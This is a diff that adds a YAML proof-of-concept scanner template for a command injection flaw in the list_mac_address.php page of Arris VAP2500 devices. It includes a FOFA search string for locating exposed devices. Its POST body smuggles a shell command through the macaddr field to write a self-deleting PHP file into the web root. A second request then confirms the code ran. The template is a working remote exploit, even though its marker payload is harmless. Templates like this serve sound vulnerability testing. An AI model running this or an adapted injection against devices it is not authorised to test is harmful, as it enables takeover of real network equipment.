@@ -1,0 +1,23 @@
+id: poc-yaml-arris-vap2500-list-mac-address-rce
+info:
+  name: Arris vap2500 list_mac_address 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: arris
+  fofa: body="./images/lg_05_1.gif"
+variables:
+  t1: random_str(6)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /list_mac_address.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+%40error_reporting%280%29%3Becho+%22{{.t2}}%22%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+%2Fvar%2Fwww%2F{{.t1}}.php&action=0&settype=1
+  expression: status_code == 200 && contains(body,"ARRIS")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
